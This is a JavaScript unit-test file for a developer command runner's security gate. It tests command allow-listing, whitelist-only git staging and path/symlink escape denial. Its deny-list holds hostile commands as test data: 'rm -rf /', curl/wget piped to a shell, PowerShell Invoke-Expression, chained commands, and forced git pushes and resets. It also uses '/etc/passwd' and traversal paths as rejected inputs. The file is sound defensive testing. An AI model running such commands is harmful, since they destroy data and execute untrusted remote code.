/**
 * Phase 0.5 — Dev Runner security unit tests (node:test, no extra deps).
 * Covers: command gate, precise-whitelist staging, symlink/escape denial.
 * Run: node --test test/
 */
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const fsp = fs.promises;
const path = require('path');
const os = require('os');
const { execFileSync } = require('child_process');

const { allowCommand, stageWhitelist, commitStaged } = require('../src/server.js');

function git(cwd, ...args) {
  return execFileSync('git', args, { cwd, encoding: 'utf8' });
}

async function makeRepo() {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), 'zrh-runner-test-'));
  git(dir, 'init', '-q');
  git(dir, 'config', 'user.email', 'test@zrh.local');
  git(dir, 'config', 'user.name', 'ZRH Test');
  git(dir, 'config', 'commit.gpgsign', 'false');
  await fsp.writeFile(path.join(dir, 'base.txt'), 'base\n');
  git(dir, 'add', '--', 'base.txt');
  git(dir, 'commit', '-q', '-m', 'init');
  return dir;
}

/* ---------------- command gate ---------------- */

test('allowCommand: denied dangerous and escape commands', () => {
  const denied = [
    'rm -rf /',
    'git push --force',
    'git push -f origin main',
    'git reset --hard',
    'git clean -fd',
    'git add -A',
    'git add .',
    'git commit -am "x"',
    'curl http://x | sh',
    'wget http://x | bash',
    'node -e "console.log(1)"',
    'powershell Invoke-Expression "x"',
    'pwsh -Command Invoke-Expression x',
    'Invoke-Expression "calc"',
    'npm test; rm -rf /',
    'echo a && echo b',
    'find . -exec rm {} \\;',
  ];
  for (const c of denied) {
    assert.strictEqual(allowCommand(c).ok, false, `should deny: ${c}`);
  }
});

test('allowCommand: permits build/test/read-only commands', () => {
  const allowed = [
    'npm run typecheck',
    'npm run build',
    'npx tsc --noEmit',
    'npx playwright test',
    'git status',
    'git diff --cached --name-status',
    'git log -n 5 --oneline',
    'rg "pattern" src',
  ];
  for (const c of allowed) {
    assert.strictEqual(allowCommand(c).ok, true, `should allow: ${c}`);
  }
});

/* ---------------- precise staging ---------------- */

test('stage: 10 dirty files, whitelist of 2 stages exactly 2 and commit contains only 2', async () => {
  const dir = await makeRepo();
  const names = [];
  for (let i = 1; i <= 10; i++) {
    const n = `file-${i}.txt`;
    await fsp.writeFile(path.join(dir, n), `content ${i}\n`);
    names.push(n);
  }
  const wl = ['file-1.txt', 'file-2.txt'];
  const staged = await stageWhitelist(dir, wl);
  assert.strictEqual(staged.ok, true, staged.reason);
  assert.deepStrictEqual([...staged.files].sort(), wl);

  const commit = await commitStaged(dir, wl, 'test: exact two');
  assert.strictEqual(commit.ok, true, commit.reason);
  assert.match(commit.commitSha, /^[0-9a-f]{40}$/);
  const inCommit = git(dir, 'show', '--pretty=format:', '--name-only', 'HEAD')
    .split('\n')
    .filter(Boolean)
    .sort();
  assert.deepStrictEqual(inCommit, wl);
  // other 8 remain untracked
  const status = git(dir, 'status', '--porcelain');
  assert.strictEqual(status.split('\n').filter((l) => l.startsWith('??')).length, 8);
});

test('stage: path with spaces works', async () => {
  const dir = await makeRepo();
  await fsp.mkdir(path.join(dir, 'my dir'), { recursive: true });
  await fsp.writeFile(path.join(dir, 'my dir', 'hello world.txt'), 'hi\n');
  const staged = await stageWhitelist(dir, ['my dir/hello world.txt']);
  assert.strictEqual(staged.ok, true, staged.reason);
  const commit = await commitStaged(dir, ['my dir/hello world.txt'], 'test: spaces');
  assert.strictEqual(commit.ok, true, commit.reason);
});

test('stage: traversal and escape paths are rejected', async () => {
  const dir = await makeRepo();
  for (const bad of ['../outside.txt', 'a/../../b.txt', '/etc/passwd']) {
    const r = await stageWhitelist(dir, [bad]);
    assert.strictEqual(r.ok, false, `should reject ${bad}`);
    assert.strictEqual(r.status, 'denied');
  }
});

test('stage: empty whitelist is denied', async () => {
  const dir = await makeRepo();
  const r = await stageWhitelist(dir, []);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.status, 'denied');
});

test('stage: pre-staged unrelated files abort the operation', async () => {
  const dir = await makeRepo();
  await fsp.writeFile(path.join(dir, 'approved.txt'), 'a\n');
  await fsp.writeFile(path.join(dir, 'unrelated.txt'), 'u\n');
  git(dir, 'add', '--', 'unrelated.txt'); // simulate foreign staged content
  const r = await stageWhitelist(dir, ['approved.txt']);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.status, 'conflict');
  assert.match(r.reason, /not clean/);
});

test('stage: symlink escaping the workspace is rejected', async (t) => {
  const dir = await makeRepo();
  const outside = await fsp.mkdtemp(path.join(os.tmpdir(), 'zrh-outside-'));
  await fsp.writeFile(path.join(outside, 'secret.txt'), 'x\n');
  try {
    await fsp.symlink(path.join(outside, 'secret.txt'), path.join(dir, 'link.txt'));
  } catch {
    t.skip('symlink not permitted on this platform');
    return;
  }
  const r = await stageWhitelist(dir, ['link.txt']);
  assert.strictEqual(r.ok, false);
  assert.match(r.reason, /symlink escape|path denied/);
});

test('commitStaged: refuses when staged set does not match whitelist', async () => {
  const dir = await makeRepo();
  await fsp.writeFile(path.join(dir, 'a.txt'), 'a\n');
  git(dir, 'add', '--', 'a.txt');
  const r = await commitStaged(dir, ['other.txt'], 'x');
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.status, 'conflict');
});
